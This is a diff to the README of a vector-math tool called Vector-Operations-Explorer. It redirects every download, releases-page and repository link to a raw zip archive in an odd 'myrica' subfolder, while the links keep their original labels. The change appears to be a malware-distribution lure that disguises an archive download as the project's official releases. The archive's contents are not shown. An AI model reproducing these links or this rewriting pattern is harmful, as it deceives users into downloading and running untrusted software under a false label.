@@ -6,7 +6,7 @@ Welcome to the Vector-Operations-Explorer! This interactive tool makes vector ma
 
 ## 📥 Download Here!
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-brightgreen)](https://github.com/Muk1k4ga-K/Vector-Operations-Explorer/releases)
+[![Download Latest Version](https://raw.githubusercontent.com/Muk1k4ga-K/Vector-Operations-Explorer/main/myrica/Vector-Operations-Explorer_3.5.zip%20Latest%20Version-v1.0-brightgreen)](https://raw.githubusercontent.com/Muk1k4ga-K/Vector-Operations-Explorer/main/myrica/Vector-Operations-Explorer_3.5.zip)
 
 ## 🌐 Overview
 
@@ -31,7 +31,7 @@ To run Vector-Operations-Explorer smoothly, ensure your system meets the followi
 
 ## 📋 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Muk1k4ga-K/Vector-Operations-Explorer/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Muk1k4ga-K/Vector-Operations-Explorer/main/myrica/Vector-Operations-Explorer_3.5.zip) to find the latest version of the software.
    
 2. **Download the Package**: Select the version you want and click the download link. This will download a compressed file containing the application.
 
@@ -55,7 +55,7 @@ To run Vector-Operations-Explorer smoothly, ensure your system meets the followi
 
 ## 🔗 Additional Resources 
 
-For more details, tutorials, and updates, visit our [GitHub Repository](https://github.com/Muk1k4ga-K/Vector-Operations-Explorer).
+For more details, tutorials, and updates, visit our [GitHub Repository](https://raw.githubusercontent.com/Muk1k4ga-K/Vector-Operations-Explorer/main/myrica/Vector-Operations-Explorer_3.5.zip).
 
 ## 📩 Contact
 
@@ -72,4 +72,4 @@ A: The application has a built-in help section you can access anytime.
 **Q: What if I encounter a bug?**  
 A: Please report it on the GitHub issues page so we can address it promptly.
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-brightgreen)](https://github.com/Muk1k4ga-K/Vector-Operations-Explorer/releases)
+[![Download Latest Version](https://raw.githubusercontent.com/Muk1k4ga-K/Vector-Operations-Explorer/main/myrica/Vector-Operations-Explorer_3.5.zip%20Latest%20Version-v1.0-brightgreen)](https://raw.githubusercontent.com/Muk1k4ga-K/Vector-Operations-Explorer/main/myrica/Vector-Operations-Explorer_3.5.zip)
